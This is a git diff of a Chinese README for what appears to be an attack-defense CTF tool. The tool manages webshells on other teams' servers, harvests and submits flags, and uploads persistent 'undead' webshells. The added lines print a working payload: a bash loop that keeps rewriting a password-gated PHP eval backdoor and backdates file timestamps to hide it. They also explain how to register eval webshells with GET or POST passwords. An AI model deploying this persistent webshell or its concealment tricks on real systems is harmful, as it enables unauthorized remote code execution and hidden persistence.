@@ -30,13 +30,15 @@ example:`add x.x.x.x:8001://index/cmd.php cmd eval post`
 
 命令执行后webshell的路径和密码会以字典的形式储存
 
-**单独处理了一种特殊情况,使用md5加密的功能函数为eval,get方法的一句话**
+**处理了使用md5加密的eval函数一句话,**
 
-在添加时,可添加带md5加密的密码的路径
+get方法在添加时,可添加带md5加密的密码的路径
 
 如:`add :8003/x.php?pass=fuckyou x eval get` 
 
+post方法请在`flag.py`中修改`for j in POST_eval_shells_path_pwd:`循环中的`evel_POST_data['pass']`为自己的密码，密码将被自动传递
 
+post添加方法同`add x.x.x.x:8001://index/cmd.php cmd eval post`
 
 ### 显示添加的webshell
 
@@ -86,6 +88,10 @@ example:`add x.x.x.x:8001://index/cmd.php cmd eval post`
 
 命令: `clearip`
 
+### 去掉指定ip
+
+命令: `removeip x.x.x.x`
+
 # flag
 
 **通过iplist和webshell获取flag，将获取到的flag提交到指定服务器**
@@ -119,6 +125,8 @@ submit完成之后会有清空flag的选项(y/n)
 
 # 上传
 
+## 文件木马上传
+
 命令: `upload <file>(default='auxi/shell.php')`
 
 默认上传文件为`auxi/shell.php` 如需使用修改默认文件,默认文件为加密不死马
@@ -131,7 +139,13 @@ submit完成之后会有清空flag的选项(y/n)
 
 如果文件上传成功，会自动访问一次上传的文件，激活不死马
 
+## 命令木马上传
 
+命令: `cupload`
+
+连接一句话执行bash命令生成不死马`.index1.php`
+
+bash命令为:`system('while true;do echo \'<?php if(md5($_POST["pass"])=="3a50065e1709acc47ba0c9238294364f"){@eval($_POST[a]);} ?>\' >fuck.php;touch -m -d "2017-11-12 10:10:10" .index1.php;sleep 1;done;');`
 
 ---
 
@@ -149,4 +163,7 @@ submit完成之后会有清空flag的选项(y/n)
 |   |—— upload.py           //webshell上传功能
 |   |—— shell.php           //默认上传文件
 |   |—— webshell.txt        //一句话储存路径  
+|   |—— command.py          //上传bash不死马
+|—— data                    //webshell数据储存
+
 ```
